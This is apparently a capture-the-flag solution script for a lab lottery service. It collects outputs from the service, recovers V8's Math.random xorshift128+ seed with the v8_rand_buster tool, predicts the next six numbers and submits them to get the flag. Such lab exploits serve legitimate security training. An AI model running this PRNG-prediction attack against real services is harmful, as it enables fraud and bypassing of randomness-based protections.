base_url="https://acc0c878-4a66-4ebd-b6f1-43251e27701f.idocker.vuln.land"

printf "" > codes.txt

echo "[+] Getting 18 random numbers from the lottery"
for i in 1 2 3
do
    curl --data '{"guess":[0,0,0,0,0,0]}' -H 'content-type: application/json' ${base_url}/make_guess | cut --delimiter='[' --fields=2 | cut --delimiter=']' --fields=1 | grep ',' | sed "s/,/\n/g" >> codes.txt
done

echo "[+] Calculate seed (take some time)"
seeds=$(cat codes.txt | tac | python v8_rand_buster/xs128p.py --multiple 10000 --lead 6)
echo $seeds

echo "[+] Next numbers"
python v8_rand_buster/xs128p.py --multiple 10000 --gen ${seeds},24 > numbers.txt
next_numbers=$(cat numbers.txt | head --lines=6 | tac | tr '\n' ' ')
echo $next_numbers

echo "[+] Getting the Flag"
curl --data $(printf '{"guess":[%s,%s,%s,%s,%s,%s]}' $next_numbers) -H 'content-type: application/json' ${base_url}/make_guess 


rm codes.txt
rm numbers.txt
